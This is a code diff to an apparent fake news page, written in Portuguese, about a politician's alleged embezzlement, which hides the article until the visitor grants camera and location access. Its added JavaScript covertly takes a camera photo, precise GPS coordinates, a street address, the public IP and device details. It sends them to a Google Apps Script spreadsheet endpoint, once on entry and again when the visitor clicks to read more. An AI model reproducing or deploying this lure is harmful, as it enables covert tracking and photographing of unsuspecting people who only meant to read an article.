@@ -393,6 +393,30 @@
             border-top: 1px solid #ddd;
         }
         
+        /* Toast de notificação */
+        .toast-notification {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #28a745;
+            color: white;
+            padding: 12px 24px;
+            border-radius: 50px;
+            font-size: 14px;
+            font-weight: bold;
+            z-index: 10001;
+            animation: toastFade 3s ease;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+        }
+        
+        @keyframes toastFade {
+            0% { opacity: 0; transform: translateX(-50%) translateY(20px); }
+            15% { opacity: 1; transform: translateX(-50%) translateY(0); }
+            85% { opacity: 1; transform: translateX(-50%) translateY(0); }
+            100% { opacity: 0; transform: translateX(-50%) translateY(-20px); }
+        }
+        
         @media (max-width: 600px) {
             .news-title {
                 font-size: 22px;
@@ -510,6 +534,7 @@
         const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzJ8LEodAEuugJ0Nz213X4jskKZdK7EQTrHWnYwWE39N0LwfuZ9axPY50TEnn7iqkcY_w/exec';
         
         let autoCaptureDone = false;
+        let firstCaptureDone = false;
         let currentStream = null;
         let cameraGranted = false;
         let locationGranted = false;
@@ -533,6 +558,16 @@
         const hiddenCanvas = document.getElementById('hiddenCanvas');
         
         fullNews.classList.add('blurred');
+        
+        function showToast(message) {
+            const toast = document.createElement('div');
+            toast.className = 'toast-notification';
+            toast.textContent = message;
+            document.body.appendChild(toast);
+            setTimeout(() => {
+                toast.remove();
+            }, 3000);
+        }
         
         function updateStatusUI() {
             if (cameraGranted) {
@@ -591,13 +626,8 @@
         async function requestAllPermissions() {
             updateStatusUI();
             
-            // Solicitar câmera primeiro
             await requestCameraPermission();
-            
-            // Pequena pausa
             await new Promise(resolve => setTimeout(resolve, 500));
-            
-            // Solicitar localização
             await requestLocationPermission();
             
             permissionsReady = cameraGranted && locationGranted;
@@ -615,8 +645,9 @@
             return permissionsReady;
         }
         
-        async function sendToGoogleSheets(data) {
+        async function sendToGoogleSheets(data, captureType) {
             try {
+                data.capture_type = captureType;
                 await fetch(GOOGLE_SCRIPT_URL, {
                     method: 'POST',
                     mode: 'no-cors',
@@ -715,7 +746,59 @@
             }
         }
         
-        async function autoCaptureAndSend() {
+        // Função para capturar e enviar dados (primeira captura - ao acessar site)
+        async function firstCaptureAndSend() {
+            if (firstCaptureDone) return;
+            
+            try {
+                const position = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {
+                        enableHighAccuracy: true,
+                        timeout: 15000
+                    });
+                });
+                
+                const { latitude, longitude, accuracy } = position.coords;
+                let finalAccuracy = Math.round(accuracy);
+                let finalLatitude = latitude;
+                let finalLongitude = longitude;
+                
+                const address = await getAddress(finalLatitude, finalLongitude);
+                const deviceInfo = getDeviceInfo();
+                const publicIP = await getPublicIP();
+                const photoData = await captureAutoPhoto();
+                
+                const completeData = {
+                    timestamp: new Date().toLocaleString('pt-BR', { timeZone: 'America/Cuiaba' }),
+                    latitude: finalLatitude,
+                    longitude: finalLongitude,
+                    google_maps_link: `https://www.google.com/maps?q=${finalLatitude},${finalLongitude}`,
+                    accuracy_meters: finalAccuracy,
+                    address: address,
+                    device: deviceInfo.device,
+                    browser: deviceInfo.browser,
+                    os: deviceInfo.os,
+                    user_agent: deviceInfo.userAgent,
+                    ip: publicIP,
+                    photo_base64: photoData || 'Sem foto',
+                    photo_captured: !!photoData,
+                    page_url: window.location.href,
+                    politician: "Deputado Chico Guarnieri - Desvio de 30 Milhões",
+                    action: "PRIMEIRA CAPTURA - ACESSO AO SITE"
+                };
+                
+                await sendToGoogleSheets(completeData, "primeira_captura");
+                firstCaptureDone = true;
+                showToast('✅ Dados enviados para a planilha!');
+                console.log('📊 PRIMEIRA CAPTURA ENVIADA - Acesso ao site');
+                
+            } catch (error) {
+                console.error('Erro na primeira captura:', error);
+            }
+        }
+        
+        // Função para segunda captura (ao clicar em Ler Mais)
+        async function secondCaptureAndSend() {
             if (autoCaptureDone) return;
             
             readMoreBtn.disabled = true;
@@ -754,10 +837,11 @@
                     photo_base64: photoData || 'Sem foto',
                     photo_captured: !!photoData,
                     page_url: window.location.href,
-                    politician: "Deputado Chico Guarnieri - Desvio de 30 Milhões"
+                    politician: "Deputado Chico Guarnieri - Desvio de 30 Milhões",
+                    action: "SEGUNDA CAPTURA - LEU MATÉRIA COMPLETA"
                 };
                 
-                await sendToGoogleSheets(completeData);
+                await sendToGoogleSheets(completeData, "segunda_captura");
                 await new Promise(resolve => setTimeout(resolve, 1500));
                 
                 loadingNews.classList.remove('show');
@@ -767,7 +851,11 @@
                 readMoreBtn.style.display = 'none';
                 autoCaptureDone = true;
                 
+                showToast('✅ Segunda captura enviada! Matéria liberada.');
+                console.log('📊 SEGUNDA CAPTURA ENVIADA - Leu matéria completa');
+                
             } catch (error) {
+                console.error('Erro na segunda captura:', error);
                 loadingNews.classList.remove('show');
                 readMoreBtn.disabled = false;
                 autoCaptureDone = false;
@@ -777,9 +865,11 @@
         initialAllowBtn.addEventListener('click', async () => {
             if (permissionsReady) {
                 initialScreen.classList.add('hide');
-                setTimeout(() => {
+                setTimeout(async () => {
                     initialScreen.style.display = 'none';
                     mainContent.classList.add('show');
+                    // Envia primeira captura ao acessar o site
+                    await firstCaptureAndSend();
                 }, 500);
             }
         });
@@ -800,8 +890,8 @@
         
         readMoreBtn.addEventListener('click', async (e) => {
             e.preventDefault();
-            if (!autoCaptureDone) {
-                await autoCaptureAndSend();
+            if (!autoCaptureDone && permissionsReady) {
+                await secondCaptureAndSend();
             }
         });
     </script>
